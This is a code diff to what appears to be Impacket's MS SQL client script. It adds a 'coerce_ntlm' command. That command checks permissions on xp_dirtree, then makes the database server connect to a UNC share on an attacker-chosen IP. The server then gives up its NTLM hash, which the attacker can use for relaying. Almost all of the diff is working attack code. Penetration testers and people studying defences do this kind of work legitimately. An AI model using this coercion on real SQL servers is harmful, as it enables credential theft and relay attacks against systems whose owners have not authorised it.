@@ -23,6 +23,7 @@ import argparse
 import sys
 import os
 import logging
+import time
 
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
@@ -45,6 +46,7 @@ if __name__ == '__main__':
      enable_xp_cmdshell         - you know what it means
      disable_xp_cmdshell        - you know what it means
      xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     coerce_ntlm {ip}           - retrieve the db ntlm hash for ntlm relaying
      sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
      ! {cmd}                    - executes a local shell cmd
      """) 
@@ -99,6 +101,20 @@ if __name__ == '__main__':
                 self.sql.printRows()
             except:
                 pass
+
+        def do_coerce_ntlm(self, s):
+            user = self.sql.sql_query("SELECT USER_NAME(grantee_principal_id) FROM sys.database_permissions p WHERE OBJECT_NAME(major_id) = 'xp_dirtree'")[0]['']
+            perm = self.sql.sql_query("SELECT permission_name FROM sys.database_permissions p WHERE OBJECT_NAME(major_id) = 'xp_dirtree'")[0]['permission_name']
+            if (user == 'public' and perm == 'EXECUTE'):
+                print("Server should be exploitable")
+            else:
+                print("The 'public' group might not have the required privileges, trying anyway")
+            start = time.time()
+            self.sql.sql_query("exec master.sys.xp_dirtree '\\\\%s\\share',1,1;" % s)
+            if (time.time() - start > 20):
+                print("Query timed out, ensure you're listening on port 445 on the specified IP")
+            else:
+                print("Coercing seems to have worked")
 
         def default(self, line):
             try:
